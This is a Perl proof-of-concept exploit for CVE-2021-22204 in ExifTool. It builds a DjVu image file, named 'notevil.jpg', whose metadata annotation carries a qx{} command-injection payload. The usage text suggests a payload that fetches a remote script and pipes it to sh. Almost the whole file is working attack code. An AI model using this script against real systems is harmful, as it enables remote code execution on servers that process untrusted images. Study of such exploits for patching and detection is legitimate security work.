#!/usr/bin/perl
use strict;
use warnings;

my $poc_imgfile = 'notevil.jpg';
my $outfile = 'ant.out';
my $djvumake = "djvumake $poc_imgfile INFO=0,0 BGjp=/dev/null ANTa=$outfile";

sub usage {
    print "POC-CVE-2021-22204\n";
    print "Usage $0 <cmd to inject> \n";
    print "\tNote: if your cmd contains unix special characters use quote!\n";
    print "\tEG: $0 \"curl xxxx.com/script.sh|sh\"\n";
    print "This poc generates an image file ($poc_imgfile) to be proccessed by vulnerable exiftool.\n";
    print "And requires DjVuLibre to be installed and in PATH\n";
    print "\t See: http://djvu.sourceforge.net/\n";
    print "---\n\n";
}

sub main {
    # search args for cmd to inject
    my $args = join(' ', @ARGV);
    my $cmd = $args || 'curl http://google.com';

    print "[+] Preparing annotation file.\n";
    open(FH, '>', $outfile) or die $!;
    while (<DATA>) {
        s/##/$cmd/;
        print FH $_;
    }
    close(FH);

    print "[+] Creating image file with: $djvumake \n";
    system($djvumake);

    # remove file
    unlink $outfile;

    print "[+] $poc_imgfile created.\n";
}

usage();
main();

__DATA__
(metadata
        (Copyright "\
" . qx{##} . \
" b ") )
